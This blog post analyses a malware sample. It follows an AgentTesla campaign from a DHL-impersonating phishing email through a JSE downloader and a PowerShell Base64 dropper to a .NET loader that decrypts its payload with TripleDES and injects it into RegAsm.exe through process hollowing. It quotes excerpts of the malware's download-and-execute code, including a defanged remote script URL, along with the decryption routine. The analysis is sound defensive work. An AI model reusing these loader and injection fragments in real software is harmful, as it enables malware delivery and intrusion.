---
title: "AgentTesla Analysis"
categories:
  - Malware Analysis
toc: true
---

This blog details the steps taken in unravelling the stages associated with a AgentTesla sample mentioned in my blog post on [Compromising Threat Actor Communications](https://polygonben.github.io/malware%20analysis/Compromising-Threat-Actor-Communications/). I thoroughly recommend checking this blog post out prior to reading this, for additional context. 

# Stage 1 (Email Attachment)

This particular campaign began with a malicious phishing email, impersonating DHL. 

The .eml file can be found on VirusTotal [here](https://www.virustotal.com/gui/file/3af579d5e612196cfa02d489f192b5c8c135556e39f0856b2e622dbe3f9002a1/detection).

* Sender: `Noreplydhl[@]windhym[.]site`
* DisplayName: `DHL Express Worldwide`
* Subject: `DHL - Shipment Document // Arrival Notice - AWB 13700658****`
* Attachment: `AWB DHL#84411.7z`

[![1](/assets/images/AgentTesla/1.png)](/assets/images/AgentTesla/1.png){: .full}

The malware itself is contained within the .7z attachment. We can see the attachment, `AWB DHL#84411.7z` (1fc37de1e469b72f89bd7624b4ffcbde), has many VT detections for "Trojan" & "Downloader".

We can use the `7z` command-line tool to extract this, revealing it contains a singular file `chase.jse`.

[![2](/assets/images/AgentTesla/2.png)](/assets/images/AgentTesla/2.png){: .full}

# Stage 2 (chase.jse)

We can see the 2nd stage, `chase.jse` (9a94ce2082740a534cf547af0a068102) is responsible for downloading another stage:

```js
// Constants to avoid magic strings
var URL = "hXXps://files[.]catbox[.]moe/8e6thc.ps1";
var DownloadPath = "C:\\Temp\\dddddd.ps1";
var TEMP_DIR = "C:\\Temp";
var SUCCESS_STATUS = 200;

//[...REDACTED...]
```

This 3rd stage, `8e6thc.ps1`, was downloaded via the `DownloadScript()` function, that uses a defined `http` object:

```js
//[...REDACTETD...]
var http = WScript.CreateObject("MSXML2.XMLHTTP");

//[...REDACTED...]

// Download the script securely
function DownloadScript(url, path) {
    http.Open("GET", url, false);
    http.Send();

    if (http.Status !== SUCCESS_STATUS) {
        LogError("Download failed with status: " + http.Status);
        return false;
    }

    try {
        var file = fileSystem.CreateTextFile(path, true);
        file.Write(http.ResponseText);
        file.Close();
        return true;
    } catch (e) {
        LogError("Error writing downloaded script: " + e.message);
        return false;
    }
}
//[...REDACTED...]
```

We can reference the [documentation](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms759148(v=vs.85)) to confirm this "MSXML2.XMLHTTP" object "provides client-side protocol support for communication with HTTP servers".

Once this 3rd-stage is written to disk, it is executed using the `RunPowerShellScript()` function:

```js
//[...REDACTED...]
var POWERSHELL_CMD = "PowerShell -NoProfile -ExecutionPolicy RemoteSigned -File ";

//[...REDACTED...]

// Execute PowerShell script
function RunPowerShellScript(scriptPath) {
    try {
        var powerShellCommand = POWERSHELL_CMD + "\"" + scriptPath + "\"";
        shell.Run(powerShellCommand, 0, true);
    } catch (e) {
        LogError("Failed to execute PowerShell script: " + e.message);
    }
}

//[...REDACTED...]
```

# Stage 3 (8e6thc.ps1)

I initially found this 3rd stage, `8e6thc.ps1` (466b9beeb51926c9d9ae9d538a2da037), via a RetroHunt query attempting to identify PowerShell scripts communicating with Telegram APIs. 

Looking at the contents of this file, we can see it contains a massive chunk of Base64 text. I have redacted the majority to save space, but this is the remaining file:

```js
$p=[IO.Path]::Combine($env:TEMP,"x.exe")
[IO.File]::WriteAllBytes($p,[Convert]::FromBase64String("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA[...REDACTED...]QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"))
Start-Process $p
```

We can see here, the file `x.exe` will be written to disk, within the the directory `C:\Users\<username>\AppData\Local\temp`. The content of this `x.exe` is retrieved by the `FromBase64String()` function. We can see the `Start-Process` cmdlet is the used to run this `x.exe` binary. 

We can either use [CyberChef](https://gchq.github.io/CyberChef/), or some command-line ninja magic to extract this PE:

[![3](/assets/images/AgentTesla/3.png)](/assets/images/AgentTesla/3.png){: .full}

Let's break this command down:

1. `cat 8e6thc.ps1` - spits out the content of the .ps1 file
2. `| grep -oE '[A-Za-z0-9+/]{50,}(==|=)?'` - from the above output, grep for a base64 string of text, 50+ characters long
3. `| base64 -d` - from the above output, decode this base64
4. `> stage4.bin` - write the contents of the base64 decoded content to a file `stage4.bin`

From our `file` command we can see the resulting file is a `PE32 executable`, or a Windows Executable (expected as it was written to `x.exe`), and also `.NET` based - meaning it is trivial for us to decompile this.

# Stage 4 (x.exe) 

## Preliminary analysis

### Detect It Easy

We can open this binary, `stage4.bin` (40927121AE9707853F62FB9D896CC167) or `x.exe`,  within DiE:

[![4](/assets/images/AgentTesla/4.png)](/assets/images/AgentTesla/4.png){: .full}

We can see this is a 32-bit .NET binary, written in C#, using .NET Framework v4.8 with CLR v4.0.30319. 

### Strings

Running strings reveals some interesting results like - `DecryptUsingTripleDES`, `AllocateMemoryForPayload`, `AllocateMemoryForPayload`, `CreateProcessA`, `InjectPayloadIntoProcess`, `VirtualAllocEx`, `WriteProcessMemory` & a massive chunk of base64 text. This may be indicative of process injection activity, but we will look into this shortly.

### capa

We can see running capa the below capabilities were discovered:

[![5](/assets/images/AgentTesla/5.png)](/assets/images/AgentTesla/5.png){: .full}

## .NET Source Code Analysis

We this is a .NET binary, we can easily recover the source code using any .NET decompiler you like. I have used DNSpy for this. 

### Program

Going through the executable, we can see all the malicious activity is occcuring within the namespace `Program`. Here the functions `AdjustThreadContextForExecution()`, `AllocateMemoryForPayload()`, `DecryptData()`, `DecryptDataUsingTripleDES()`, `ExecutePayload()`, `InitializeProcessStartupInfo()`, `InjectPayloadIntoProcess()`, `ResumeThreadContext()`, `StartExecutableProcess()`, `WriteHeadersAndSectionsToMemory()`& `Main()` are all defined. 

[![6](/assets/images/AgentTesla/6.png)](/assets/images/AgentTesla/6.png){: .full}

#### Main()

The Main method initializes three important elements:

* A large Base64-encoded string (named text) that represents the encrypted payload.
* A key and an initialization vector (IV) – also provided as Base64 strings.
* It then calls `ExecutePayload()` with these parameters.

```c#
private static void Main(string[] args)
    {
      string text = "fK2NaQxHVYZVTAo+NeLyWNkL[...REDACTED...]";
      byte[] array = Convert.FromBase64String("iA9B1uKFddQdqiLSSuzvD2GhL1o2Jv+v");
      byte[] array2 = Convert.FromBase64String("b2CBFvcQeV4=");
      Program.ExecutePayload(text, array, array2);
    }
```

#### ExecutePayload()

We can see in the Main() function, the 5th stage is executed via calling the `ExecutePayload()` function:

```c#
    private static void ExecutePayload(string encryptedData, byte[] key, byte[] iv)
    {
      byte[] array = Program.DecryptData(encryptedData, key, iv);
      bool flag = array != null;
      if (flag)
      {
        string text = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe");
        Program.InjectPayloadIntoProcess(text, array);
      }
    }
```

Nice! We can see process injection is occuring here, which we'll get onto shortly, but prior to this - the payload is decrypted using the `DecryptData()` function.

#### Payload Decryption 

The functions `DecryptData()` & `DecryptUsingTripleDES()` are used to decrypt. 

##### DecryptData()

```c#
    private static byte[] DecryptData(string encryptedData, byte[] key, byte[] iv)
    {
      byte[] array = Convert.FromBase64String(encryptedData);
      return Program.DecryptUsingTripleDES(array, key, iv);
    }
```

* DecryptData first converts the provided encrypted string from Base64 back into a byte array.

##### DecryptUsingTripleDES()

```c#
    private static byte[] DecryptUsingTripleDES(byte[] cipherText, byte[] key, byte[] iv)
    {
      byte[] array;
      using (TripleDES tripleDES = TripleDES.Create())
      {
        tripleDES.KeySize = 128;
        tripleDES.BlockSize = 64;
        tripleDES.Padding = PaddingMode.PKCS7;
        tripleDES.Mode = CipherMode.CBC;
        tripleDES.Key = key;
        tripleDES.IV = iv;
        using (ICryptoTransform cryptoTransform = tripleDES.CreateDecryptor(tripleDES.Key, tripleDES.IV))
        {
          using (MemoryStream memoryStream = new MemoryStream())
          {
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write))
            {
              cryptoStream.Write(cipherText, 0, cipherText.Length);
              cryptoStream.FlushFinalBlock();
              array = memoryStream.ToArray();
            }
          }
        }
      }
      return array;
    }
```

* It then calls DecryptUsingTripleDES, which uses the TripleDES algorithm in CBC mode with PKCS7 padding to decrypt the payload using the provided key and IV.

#### Process Injection

We can see that Process Hollowing of the `RegAsm.exe` process is being performed here, which can be broken down into the following steps:

* Choosing the Host Process: After decryption, the code builds the path to `RegAsm.exe` (a legitimate .NET assembly registration tool found in the runtime directory). This executable is used as a host for the injected payload.

* Injection Routine (InjectPayloadIntoProcess):

1) Process Creation: It first calls `InitializeProcessStartupInfo` and then uses `StartExecutableProcess` to create a new process in a suspended state. The use of `CreateProcessA` (wrapped inside the helper class BaseApp) indicates that the process is started with the intention of being manipulated before it begins execution.

2) Setting Up Thread Context: It retrieves the current thread context of the suspended process with `SetupThreadContext`, which is necessary to later change the execution point (instruction pointer) to the injected code.

3) Memory Allocation: The method `AllocateMemoryForPayload` uses `VirtualAllocEx` to reserve memory in the remote process. This memory will hold the payload.

4) Writing the Payload: With `WriteHeadersAndSectionsToMemory`, the code copies the payload’s headers and section data into the allocated memory space of the target process. This involves parsing the PE (Portable Executable) format to locate the relevant parts.

5) Adjusting Thread Context: The `AdjustThreadContextForExecution` method modifies the thread’s context (especially the instruction pointer) so that when execution resumes, it starts running from the injected payload instead of the original code.

6) Resuming Execution: Finally, `ResumeThreadExecution` resumes the suspended process. Since the thread context was modified, the payload begins execution within the context of a legitimate process.
